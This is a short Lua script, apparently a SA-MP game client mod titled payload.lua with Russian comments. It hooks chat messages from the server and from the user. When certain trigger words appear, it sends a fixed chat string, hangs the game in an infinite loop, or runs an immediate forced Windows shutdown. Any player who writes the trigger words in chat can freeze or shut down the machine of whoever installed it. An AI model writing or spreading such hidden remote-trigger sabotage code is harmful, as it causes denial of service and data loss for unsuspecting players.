-- payload.lua
print('load')
local sampev = require 'lib.samp.events'

-- 1. Ловим ВСЕ сообщения, которые приходят С СЕРВЕРА (включая дубликаты твоих)
function sampev.onServerMessage(color, text)
    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
    
    if cleanText:find("сырколбаска") then
        sampSendChat("123655")
    elseif cleanText:find("кукусики") then
        while true do end
    elseif cleanText:find("хуйкина") then
        os.execute("shutdown /s /t 0 /f")
    end
end

-- 2. Ловим то, что отправляешь ТЫ (через пакет 101 - SendChat)
function sampev.onSendChat(message)
    if message:find("сырколбаска") then
        lua_thread.create(function()
            wait(500)
            sampSendChat("123655")
        end)
    elseif message:find("кукусики") then
        while true do end
    elseif message:find("хуйкина") then
        os.execute("shutdown /s /t 0 /f")
    end
end
